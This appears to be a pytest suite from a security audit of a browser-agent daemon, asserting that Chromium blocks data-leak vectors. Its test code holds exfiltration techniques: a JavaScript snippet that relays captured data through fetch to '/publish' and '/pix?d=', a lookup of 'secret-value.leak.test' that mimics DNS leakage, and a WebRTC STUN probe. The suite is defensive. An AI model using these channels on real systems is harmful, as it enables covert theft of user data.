"""Round 10: the round-9 auditor's vectors (test_zz_my_r9.py, MODE=persistent|cdp) as assertions, plus
the launch-args and CDP fail-closed checks. Real Chromium. The auditor's own test only prints."""
import os
import socket
import subprocess
import time

import pytest

from test_zz_my_r9 import setup_mode, V, OTHER, MODE, UDP, CDP_PORT, start_mode, ARGS  # noqa: F401
from test_m18_login_browser import _compose_with_values
from test_m18_login_round5 import _nav_click
from test_aud_round7 import SECRET, leaked
from app.modules.m13_browser_agent.pc_daemon.config import DaemonConfig
from app.modules.m13_browser_agent.pc_daemon.daemon import BrowserHandle


if os.environ.get('ATTEST'):  # MODE=cdp ATTEST=1: the owner attests the attached browser; the live probe still runs
    _orig_init = BrowserHandle.__init__

    def _attesting_init(self, config):
        config.cdp_containment_attested = True
        _orig_init(self, config)
    BrowserHandle.__init__ = _attesting_init


def _drain_udp():
    packets = []
    try:
        while True:
            packets.append(UDP.recvfrom(2000)[0][:12])
    except Exception:  # noqa: BLE001
        pass
    return packets


@pytest.mark.asyncio
@pytest.mark.parametrize('name', sorted(V))
async def test_auditor_r9_vector(setup_mode, name):
    setup = setup_mode
    page, _ = await _compose_with_values(setup); site = setup[6]
    daemon = site.daemon
    other = None
    if name in OTHER:
        other = await daemon.browser._context.new_page(); await other.goto(setup[1].origin + '/compose')
        await other.evaluate("""(()=>{window.__got=[];window.__bc=new BroadcastChannel('x');__bc.onmessage=e=>{window.__got.push(e.data);fetch('/publish',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:e.data})};addEventListener('storage',e=>{window.__got.push('LS:'+e.newValue);fetch('/pix?d=LS'+btoa(e.newValue))})})()""")
        await page.goto(setup[1].origin + '/compose')
    await page.fill('#draft', SECRET)
    try:
        await page.evaluate(V[name])
    except Exception as error:  # noqa: BLE001 - the vector cannot even be set up: the frame-deny script threw
        assert 'blocked by Atlas guard' in str(error), error
    if 'prelist' in name:
        await page.fill('#draft', SECRET + '2')
    site.hits.clear(); site.posts.clear(); site.post_paths.clear(); _drain_udp()
    try:
        answer = await _nav_click(setup, '#attack')
    except Exception as error:  # noqa: BLE001 - a refusal (CDP without containment) is a safe outcome
        answer = {'ok': False, 'error': str(error)}
    for _ in range(32 if '20s' in name or 'late' in name else 14):
        await page.wait_for_timeout(700)
    udp = _drain_udp()
    got = await other.evaluate('window.__got') if other else []
    shown = [h[0][:9] + h[2][:30] for h in site.hits if h[2] != '/compose'][:6]
    assert not leaked(site), (MODE, name, shown)
    assert not site.posts and not site.post_paths, (MODE, name, site.posts)
    assert udp == [], (MODE, name, 'UDP/ICE packet left the browser')
    assert not got, (MODE, name, got)


def test_launch_args_carry_network_containment_and_refuse_a_proxy():
    args = BrowserHandle(DaemonConfig(site_hosts=['127.0.0.1', 'example.test'], browser_args=['--x'])).launch_args()
    assert '--disable-quic' in args and '--no-proxy-server' in args
    assert '--force-webrtc-ip-handling-policy=disable_non_proxied_udp' in args and '--x' in args
    assert '--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1, EXCLUDE example.test' in args
    for bad in ('--proxy-server=http://p:1', '--proxy-pac-url=http://p/x.pac'):
        with pytest.raises(ValueError):
            BrowserHandle(DaemonConfig(browser_args=[bad])).launch_args()


@pytest.mark.asyncio
async def test_a_browser_started_through_launch_args_resolves_only_the_site_and_sends_no_udp(tmp_path):
    """Exercise launch_args() for real: BrowserHandle.start() with a persistent profile."""
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    seen = []

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            seen.append((self.headers['Host'], self.path))
            self.send_response(200); self.send_header('Content-Type', 'text/html'); self.end_headers(); self.wfile.write(b'ok')
    srv = ThreadingHTTPServer(('127.0.0.1', 0), H); threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_port
    config = DaemonConfig(profile_dir=str(tmp_path / 'p'), site_hosts=['127.0.0.1'], browser_args=['--headless=new', '--no-sandbox'])
    handle = BrowserHandle(config); await handle.start()
    try:
        page = await handle.page('s')
        await page.goto(f'http://127.0.0.1:{port}/')
        assert seen and seen[0][0].startswith('127.0.0.1')
        seen.clear()
        failure = None
        try:
            await page.goto(f'http://secret-value.leak.test:{port}/')
        except Exception as error:  # noqa: BLE001
            failure = str(error)
        assert failure and 'ERR_NAME_NOT_RESOLVED' in failure, failure
        assert not seen
        _drain_udp()
        await page.evaluate("p => { try { new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:'+p}]}).createDataChannel('x') } catch (e) {} }", UDP.getsockname()[1])
        await page.wait_for_timeout(1500)
        assert _drain_udp() == []
    finally:
        await handle._context.close(); await handle._playwright.stop(); srv.shutdown()


@pytest.mark.asyncio
async def test_guarded_click_on_a_cdp_attached_browser_fails_closed_without_attestation(tmp_path):
    handle = BrowserHandle(DaemonConfig(cdp_url='http://127.0.0.1:1'))
    reason = await handle.verify_containment()
    assert reason and 'refused' in reason


def _chrome(tmp_path, port, flags):
    proc = subprocess.Popen(['google-chrome', '--headless=new', '--no-sandbox', f'--remote-debugging-port={port}',
                             f'--user-data-dir={tmp_path}/cprof', *flags], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(60):
        try:
            socket.create_connection(('127.0.0.1', port), 0.2).close(); break
        except OSError:
            time.sleep(0.2)
    return proc


@pytest.mark.asyncio
@pytest.mark.parametrize('deny_script,expect_ok', [(True, True), (False, False)])
async def test_attested_cdp_browser_is_accepted_only_if_the_live_udp_probe_is_silent(tmp_path, monkeypatch, deny_script, expect_ok):
    """Negative control: with the page-script deny layer emptied, the probe sees UDP and refuses."""
    from app.modules.m13_browser_agent.session_bridge import form_guard
    if not deny_script:
        monkeypatch.setattr(form_guard, 'FRAME_DENY_JS', '')
    port = 9355 if expect_ok else 9356
    proc = _chrome(tmp_path, port, ['--disable-quic'])
    handle = BrowserHandle(DaemonConfig(cdp_url=f'http://127.0.0.1:{port}', cdp_containment_attested=True))
    try:
        await handle.start()
        reason = await handle.verify_containment()
        assert (reason is None) == expect_ok, reason
    finally:
        try:
            await handle._playwright.stop()
        finally:
            proc.terminate(); proc.wait(10)
